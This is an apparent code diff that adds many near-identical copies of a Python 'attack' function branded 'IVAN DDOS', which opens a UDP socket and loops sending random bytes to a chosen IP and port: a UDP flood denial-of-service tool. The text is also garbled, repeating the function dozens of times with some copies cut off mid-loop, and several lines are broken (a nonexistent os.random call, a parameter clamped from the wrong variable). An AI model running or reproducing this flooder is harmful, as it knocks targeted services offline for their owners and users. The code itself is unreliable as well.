+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
